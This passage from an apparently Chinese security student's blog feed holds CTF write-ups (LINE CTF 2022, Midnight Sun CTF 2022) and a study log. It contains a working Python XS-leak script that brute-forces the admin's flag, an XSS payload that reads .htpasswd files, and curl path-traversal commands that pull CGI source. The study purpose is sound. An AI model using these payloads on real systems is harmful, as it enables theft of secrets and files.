    <summary type="html">&lt;p&gt;打算把 &lt;a href=&quot;http://xsleak.dev/&quot;&gt;http://xsleak.dev&lt;/a&gt; 上的知识点全部过一遍 顺便找对应的题目来复现一下&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="xsleak" scheme="http://example.com/tags/xsleak/"/>
    
  </entry>
  
  <entry>
    <title>FTP-sec</title>
    <link href="http://example.com/2022/04/13/FTP-sec/"/>
    <id>http://example.com/2022/04/13/FTP-sec/</id>
    <published>2022-04-13T10:58:34.000Z</published>
    <updated>2022-04-13T11:00:33.711Z</updated>
    
    <content type="html"><![CDATA[<p>最近学习一下关于FTP的安全</p><p>故意要花上两个星期</p><span id="more"></span><p><a href="http://www.yang99.top/index.php/archives/43/#ftp%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E6%94%BB%E5%87%BBmongodb">http://www.yang99.top/index.php/archives/43/#ftp%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E6%94%BB%E5%87%BBmongodb</a></p><p><a href="https://brycec.me/posts/starctf2021_writeups#oh-my-bet">https://brycec.me/posts/starctf2021_writeups#oh-my-bet</a></p><p><a href="https://ctftime.org/task/15024">https://ctftime.org/task/15024</a></p><p><a href="https://ctftime.org/task/14015">https://ctftime.org/task/14015</a></p><p><a href="https://ctftime.org/writeup/29641">https://ctftime.org/writeup/29641</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近学习一下关于FTP的安全&lt;/p&gt;
&lt;p&gt;故意要花上两个星期&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="FTP" scheme="http://example.com/tags/FTP/"/>
    
  </entry>
  
  <entry>
    <title>LINECTF2022</title>
    <link href="http://example.com/2022/04/12/LINECTF2022/"/>
    <id>http://example.com/2022/04/12/LINECTF2022/</id>
    <published>2022-04-12T12:17:20.000Z</published>
    <updated>2022-04-13T10:39:03.465Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web题复现"><a href="#web题复现" class="headerlink" title="web题复现"></a>web题复现</h1><h3 id="title-todo"><a href="#title-todo" class="headerlink" title="title todo"></a>title todo</h3><p>解这个题需要先了解几个知识点</p><span id="more"></span><h4 id="我的思路"><a href="#我的思路" class="headerlink" title="我的思路"></a>我的思路</h4><p>首先在 app.py 中注意到了 csp  非常严格</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_header</span>(<span class="params">response</span>):</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Security-Policy&#x27;</span>] = <span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; style-src &#x27;self&#x27;; img-src &#x27;self&#x27; blob:&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>我们可以上传一张图片和一个title</p><p>并且可以 share to admim</p><p>然后我找了一个可以进行xss的点 位于 imge.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;title is-3&quot;</span>&gt;</span>&#123;&#123; image.title &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;&#123;</span> <span class="attr">image.url</span> &#125;&#125; <span class="attr">class</span>=<span class="string">&quot;mb-3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">hidden</span> <span class="attr">id</span>=<span class="string">&quot;imgId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; image.id &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">&#123;% if not shared %&#125;</span><br></pre></td></tr></table></figure><p>我们发现 我们可控 <code>image.url</code>  并且可以造成xss （理论上）</p><p><strong>但是我随即发现xss并不能成功 因为 csp 而我当时并没有意识到这一点 导致 我直接卡在了这里</strong></p><h4 id="欠缺在哪里？"><a href="#欠缺在哪里？" class="headerlink" title="欠缺在哪里？"></a>欠缺在哪里？</h4><p>上传文件和</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/image/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_image</span>():</span><br><span class="line">    img_file = request.files[<span class="string">&#x27;img_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> img_file:</span><br><span class="line">        ext = os.path.splitext(img_file.filename)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> ext <span class="keyword">in</span> [<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>]:</span><br><span class="line">            filename = uuid4().<span class="built_in">hex</span> + ext</span><br><span class="line"></span><br><span class="line">            img_path = os.path.join(app.config.get(<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>), filename)</span><br><span class="line">            img_file.save(img_path)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;img_url&#x27;</span>: <span class="string">f&#x27;/static/image/<span class="subst">&#123;filename&#125;</span>&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/image&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_image</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        title = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">        img_url = request.form.get(<span class="string">&#x27;img_url&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> title <span class="keyword">and</span> img_url:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> img_url.startswith(<span class="string">&#x27;/static/image/&#x27;</span>):</span><br><span class="line">                flash(<span class="string">&#x27;Image creation failed&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;create_image&#x27;</span>))</span><br><span class="line"></span><br><span class="line">            image = Image(title=title, url=img_url, owner=current_user)</span><br><span class="line">            db.session.add(image)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            res = redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">            res.headers[<span class="string">&#x27;X-ImageId&#x27;</span>] = image.<span class="built_in">id</span></span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;create_image&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;create_image.html&#x27;</span>)</span><br></pre></td></tr></table></figure><p>也就是说 上传图像 和 上传 title 和 image.url 是分开的</p><p>然后看一下 nginx 的</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /static &#123;</span><br><span class="line">            <span class="attribute">uwsgi_cache</span> one;</span><br><span class="line">            <span class="attribute">uwsgi_cache_valid</span> <span class="number">200</span> <span class="number">5m</span>;</span><br><span class="line">            <span class="attribute">uwsgi_ignore_headers</span> X-Accel-Redirect X-Accel-Expires Cache-Control Expires Vary;</span><br><span class="line">            </span><br><span class="line">            <span class="attribute">include</span> uwsgi_params;</span><br><span class="line">            <span class="attribute">uwsgi_pass</span> app;</span><br><span class="line"></span><br><span class="line">            <span class="attribute">add_header</span> X-Cache-Status <span class="variable">$upstream_cache_status</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>uwsgi_cache_valid</code> – 根据响应码设置缓存时间</p><p>然后就要讲到一个很重要的知识点 </p><p><a href="https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/">https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/</a></p><p><a href="https://chromestatus.com/feature/4733392803332096">https://chromestatus.com/feature/4733392803332096</a></p><p>其实这个已经在很多次比赛中出现过了 </p><p>比如 PlaidCTF2020</p><p><a href="https://ctftime.org/writeup/20254">https://ctftime.org/writeup/20254</a></p><blockquote><p>If a page contains images with <a href="https://web.dev/native-lazy-loading/">Lazy Loading</a>, an attacker can detect if fragment navigation that included an image occurred by checking whether the image was <a href="https://xsleaks.dev/docs/attacks/cache-probing/">cached in the browser</a>. This works because <a href="https://web.dev/native-lazy-loading/">Lazy Loading</a> images are only fetched (and cached) when they appear in the viewport.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">chall_url = <span class="string">&quot;http://35.187.204.223&quot;</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="comment">#s.proxies.update(&#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;&#125;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_hit</span>(<span class="params">image</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;HIT&quot;</span> == s.head(chall_url + image).headers[<span class="string">&quot;X-Cache-Status&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">share</span>(<span class="params">path</span>):</span><br><span class="line">    s.post(chall_url + <span class="string">&quot;/share&quot;</span>,</span><br><span class="line">           headers=&#123;<span class="string">&quot;Content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;, json=&#123;<span class="string">&quot;path&quot;</span>: path&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_post</span>(<span class="params">image</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/image/&quot;</span> + s.post(chall_url + <span class="string">&quot;/image&quot;</span>, headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;, allow_redirects=<span class="literal">False</span>, data=&#123;</span><br><span class="line">           <span class="string">&quot;title&quot;</span>: <span class="string">&quot;W&quot;</span>*<span class="number">3000</span>, <span class="string">&quot;img_url&quot;</span>: image + <span class="string">&quot; loading=lazy&quot;</span></span><br><span class="line">    &#125;).headers[<span class="string">&quot;X-ImageId&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_image</span>():</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundarySyjbxI4bmreUQGnT&quot;</span>&#125;</span><br><span class="line">    data = <span class="string">&quot;------WebKitFormBoundarySyjbxI4bmreUQGnT\r\nContent-Disposition: form-data; name=\&quot;img_file\&quot;; filename=\&quot;foo.jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\nfoo\r\n------WebKitFormBoundarySyjbxI4bmreUQGnT--\r\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> s.post(chall_url + <span class="string">&quot;/image/upload&quot;</span>, headers=headers, data=data).json()[<span class="string">&quot;img_url&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># login</span></span><br><span class="line">s.post(chall_url + <span class="string">&quot;/register&quot;</span>,</span><br><span class="line">       headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;, data=<span class="string">&quot;username=foofoo&amp;password=barbar&quot;</span>)</span><br><span class="line">s.post(chall_url + <span class="string">&quot;/login&quot;</span>,</span><br><span class="line">       headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;, data=<span class="string">&quot;username=foofoo&amp;password=barbar&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Registered&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">known = <span class="string">&quot;LINECTF&#123;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&quot;/0123456789abcdef&quot;</span>:</span><br><span class="line">        current_image = upload_image()</span><br><span class="line">        current_post = new_post(current_image)</span><br><span class="line">        </span><br><span class="line">        share(current_post[<span class="number">1</span>:] + <span class="string">&quot;#:~:text=&quot;</span> + known + char)</span><br><span class="line">        sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> is_hit(current_image):</span><br><span class="line">            known += char</span><br><span class="line">            <span class="built_in">print</span>(known)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Flag: &quot;</span> + known)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="参考大佬文章"><a href="#参考大佬文章" class="headerlink" title="参考大佬文章"></a>参考大佬文章</h4><p><a href="https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e">https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e</a></p><p><a href="https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/#title-todo">https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/#title-todo</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;web题复现&quot;&gt;&lt;a href=&quot;#web题复现&quot; class=&quot;headerlink&quot; title=&quot;web题复现&quot;&gt;&lt;/a&gt;web题复现&lt;/h1&gt;&lt;h3 id=&quot;title-todo&quot;&gt;&lt;a href=&quot;#title-todo&quot; class=&quot;headerlink&quot; title=&quot;title todo&quot;&gt;&lt;/a&gt;title todo&lt;/h3&gt;&lt;p&gt;解这个题需要先了解几个知识点&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>learn-month2</title>
    <link href="http://example.com/2022/04/12/learn-month2/"/>
    <id>http://example.com/2022/04/12/learn-month2/</id>
    <published>2022-04-12T12:03:03.000Z</published>
    <updated>2022-04-25T02:00:41.877Z</updated>
    
    <content type="html"><![CDATA[<h1 id="learn-month2"><a href="#learn-month2" class="headerlink" title="learn-month2"></a>learn-month2</h1><p>第二月的学习记录</p><span id="more"></span><h2 id="day1-–-4-12"><a href="#day1-–-4-12" class="headerlink" title="day1 – 4.12"></a>day1 – 4.12</h2><table><thead><tr><th>mission</th><th>achieve</th></tr></thead><tbody><tr><td>听一节汇编课</td><td>Y</td></tr><tr><td>学习 pwn.college 第二课时</td><td>Y</td></tr><tr><td>学习 xs-leak 的小技巧</td><td>Y</td></tr></tbody></table><h2 id="day2-–-4-13"><a href="#day2-–-4-13" class="headerlink" title="day2 – 4.13"></a>day2 – 4.13</h2><table><thead><tr><th>mission</th><th>是否完成</th></tr></thead><tbody><tr><td>听一节汇编课</td><td>Y</td></tr><tr><td>继续 pwn.college 第二课时</td><td>Y</td></tr><tr><td>继续复现LineCTF</td><td>N</td></tr><tr><td>改 srtp 申报表</td><td>N</td></tr></tbody></table><h2 id="day3-–-4-14"><a href="#day3-–-4-14" class="headerlink" title="day3 – 4.14"></a>day3 – 4.14</h2><table><thead><tr><th>misssion</th><th>achieve</th></tr></thead><tbody><tr><td>结束汇编寄存器学习</td><td>Y</td></tr><tr><td>datawhale数据结构</td><td>Y</td></tr><tr><td>预习计组实验</td><td>Y</td></tr><tr><td>xsleak写一篇文章</td><td>Y</td></tr><tr><td>pwn.college 第二course 拓展阅读</td><td>Y</td></tr></tbody></table><h2 id="day56-4-164-17"><a href="#day56-4-164-17" class="headerlink" title="day56  4.164.17"></a>day5<del>6  4.16</del>4.17</h2><table><thead><tr><th>mission</th><th>achieved</th></tr></thead><tbody><tr><td>打starctf</td><td>Y</td></tr><tr><td>打crewctf</td><td>Y</td></tr></tbody></table><h2 id="day7-4-18"><a href="#day7-4-18" class="headerlink" title="day7 4.18"></a>day7 4.18</h2><table><thead><tr><th>mission</th><th>achieved</th></tr></thead><tbody><tr><td>复现周末的两场比赛</td><td>未完全完成</td></tr><tr><td>听一节pwn课</td><td>Y</td></tr></tbody></table><h2 id="day8-4-19"><a href="#day8-4-19" class="headerlink" title="day8 4.19"></a>day8 4.19</h2><p>最近压力有点大 不能玩了 55555</p><table><thead><tr><th>mission</th><th>achieved</th></tr></thead><tbody><tr><td>听一节星盟的pwn课</td><td>Y</td></tr><tr><td>听完pwn college的二部分所有的课</td><td>N</td></tr><tr><td>复现比赛</td><td>N</td></tr></tbody></table><h2 id="day9-4-20"><a href="#day9-4-20" class="headerlink" title="day9 4.20"></a>day9 4.20</h2><table><thead><tr><th>misssion</th><th>achieved</th></tr></thead><tbody><tr><td>听一节星盟的pwn课</td><td>Y</td></tr><tr><td>听完pwn college的二部分所有的课</td><td>Y</td></tr><tr><td>重新整了俩虚拟机</td><td>Y</td></tr><tr><td>成功在虚拟机上配上了代理 （555 要哭了</td><td>Y</td></tr><tr><td>gdb调试学习</td><td>Y</td></tr></tbody></table><h2 id="day10-4-21"><a href="#day10-4-21" class="headerlink" title="day10 4.21"></a>day10 4.21</h2><p>貌似最近都没搞实验室的东西 要抽时间搞一下了</p><p>真是服了 越是水课 越是b事多 中国computer education真是lj</p><table><thead><tr><th>mission</th><th>achieved</th></tr></thead><tbody><tr><td>看一下学者给的数据集和代码</td><td>Y</td></tr><tr><td>听一节星盟的pwn课</td><td>Y</td></tr></tbody></table><h2 id="day11-13"><a href="#day11-13" class="headerlink" title="day11~13"></a>day11~13</h2><p>推了个大飞</p><h2 id="day14-4-25"><a href="#day14-4-25" class="headerlink" title="day14 4.25"></a>day14 4.25</h2><table><thead><tr><th>misssion</th><th>achieved</th></tr></thead><tbody><tr><td>总结一下SSTI</td><td></td></tr><tr><td>pwn.college suid提权</td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="长期任务"><a href="#长期任务" class="headerlink" title="长期任务"></a>长期任务</h2><table><thead><tr><th align="left">任务</th><th>计划完成时间</th><th>是否完成</th></tr></thead><tbody><tr><td align="left">FTP相关漏洞</td><td>五一假期结束之前</td><td></td></tr><tr><td align="left">srtp申请</td><td>4.18之前</td><td>Y</td></tr><tr><td align="left">kaggle流量预测</td><td>五一之前</td><td></td></tr><tr><td align="left">cs107E</td><td>放假之前</td><td></td></tr><tr><td align="left">星盟pwn教程</td><td>放假之前</td><td></td></tr><tr><td align="left">pwn.college</td><td>暑假</td><td></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;learn-month2&quot;&gt;&lt;a href=&quot;#learn-month2&quot; class=&quot;headerlink&quot; title=&quot;learn-month2&quot;&gt;&lt;/a&gt;learn-month2&lt;/h1&gt;&lt;p&gt;第二月的学习记录&lt;/p&gt;</summary>
    
    
    
    <category term="learn" scheme="http://example.com/categories/learn/"/>
    
    
    <category term="learn365" scheme="http://example.com/tags/learn365/"/>
    
  </entry>
  
  <entry>
    <title>MidnightCTF2022</title>
    <link href="http://example.com/2022/04/11/MidnightCTF2022/"/>
    <id>http://example.com/2022/04/11/MidnightCTF2022/</id>
    <published>2022-04-11T04:13:15.000Z</published>
    <updated>2022-04-13T10:39:09.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MidSunCTF"><a href="#MidSunCTF" class="headerlink" title="MidSunCTF"></a>MidSunCTF</h1><p>啥都没做出来  感觉这学期水平没啥长进  主要是精力有点分散了  不过路还很长 加油~</p><span id="more"></span><h2 id="retro"><a href="#retro" class="headerlink" title="retro"></a>retro</h2><blockquote><p>Check out my homepage in cyber space</p></blockquote><p>尝试一下读文件 (后来想了下 这个想法可能是愚蠢的  或许这种方法只适合在特定的场合中使用)</p><p><img src="D:\MyBlog\b1ue0cean.github.io\source_posts\MidnightCTF2022.assets\image-20220402184941839.png" alt="image-20220402184941839"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;./&quot;</span> <span class="attribute">height</span>=<span class="string">&quot;1600px&quot;</span> <span class="attribute">width</span>=<span class="string">&quot;800px&quot;</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Apache</span>/<span class="number">2</span>.<span class="number">4</span>.<span class="number">53</span> (Unix)</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params">&#123;<span class="variable language_">document</span>.write(<span class="variable language_">this</span>.responseText)&#125;;x.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///.htpasswds&quot;</span>);x.send();</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="学习别人的解法"><a href="#学习别人的解法" class="headerlink" title="学习别人的解法"></a>学习别人的解法</h3><p>引用：<a href="https://scavengersecurity.com/posts/midnightsunctf-retro/">https://scavengersecurity.com/posts/midnightsunctf-retro/</a></p><p>在 <code>/cgi-bin/showimg.cgi?./1.gif</code>  这个接口似乎有问题</p><p>但是 只能以 <code>.gif</code> 结尾   所以 我们要想办法来绕过？</p><p>怎么绕过？</p><p>看了两篇writeup 他们似乎风轻云淡的说 可以通过长度限制来绕过</p><p>但究竟是为什么？ </p><p>这可能要从这题的环境说起</p><p>The environment is set up as follows:</p><ul><li>We don’t have ability to upload files</li><li>It doesn’t have a database  (具体怎么看出来的我不太清楚)</li><li>The data isn’t saved anywhere server-side and there are no cookies.</li></ul><p>如果按这个思路想下去 可以判断出(引用大佬分析)</p><p>The points we came across with the testing is the following one:</p><ul><li>The user request is stored in a large buffer</li><li>The extension comparison is successfully checked with this buffer</li><li>The request is formatted into a smaller buffer so the exceeded characters are not included.</li><li>If we exploit the buffer size differences, with correct length, final path may be clean of the mandatory <code>.gif</code> extension so we’re able to get any file in the server independent to the extension.</li></ul><p>so 可以构造一个截断的payload 来实现任意文件读取 （ 很难想到</p><p>最终下载方式如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/usr/</span>local<span class="regexp">/apache2/</span>cgi-bin<span class="regexp">/color.cgi/</span>.gif -o color.cgi</span><br><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>apache2<span class="regexp">/cgi-bin/m</span>adlib.cgi/.gif -o madlib.cgi</span><br><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/usr/</span>local<span class="regexp">/apache2/</span>cgi-bin<span class="regexp">/lorem.cgi/</span>.gif -o lorem.cgi</span><br><span class="line">curl http:<span class="regexp">//</span>retro-<span class="number">01</span>.hfsc.tf:<span class="number">8080</span><span class="regexp">/cgi-bin/</span>showimg.cgi\?<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>apache2<span class="regexp">/cgi-bin/</span>joke.cgi/.gif -o 